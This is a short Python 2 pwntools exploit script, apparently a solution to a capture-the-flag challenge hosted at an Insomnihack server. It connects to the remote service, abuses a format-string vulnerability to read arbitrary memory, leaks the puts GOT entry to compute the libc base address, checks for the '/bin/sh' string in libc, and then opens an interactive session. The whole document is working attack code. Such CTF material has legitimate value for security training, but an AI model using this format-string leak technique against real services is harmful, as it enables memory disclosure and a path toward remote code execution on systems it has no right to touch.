#!/usr/bin/env python2
from pwn import *

# Definitions
libc = ELF('./libc.so.6',checksec=False)
io = remote('covidless.insomnihack.ch',6666)

# Dummy value to initialize puts
def dummy():
    io.recvrepeat(0.3)
    io.sendline('dummy')

# Read value at address
def fmt_str_read(addr):
    io.recvrepeat(0.3)
    io.sendline('%14$s###########'+p64(addr))
    out = io.recvuntil('###########').split('###########')[0]
    out = out.split('Your covid pass is invalid : ')[1]
    out = out.split('#elev$delim')[0]
    return out

# Leak puts@got and get libc base
def leak_libc():
    libc.address = u64(fmt_str_read(0x601018).ljust(8,'\x00')) - 0x0809c0
    log.success('Libc: ' + hex(libc.address))
   
# Exploit
def pwn():
    dummy()
    leak_libc()

    if fmt_str_read(libc.address+0x1b3e9a) == '/bin/sh':
        log.success('Libc matches!')
    else:
        log.warning('Libc doesnt match!')

    # Clean junk data
    io.recvrepeat(0.3)

pwn()
io.interactive()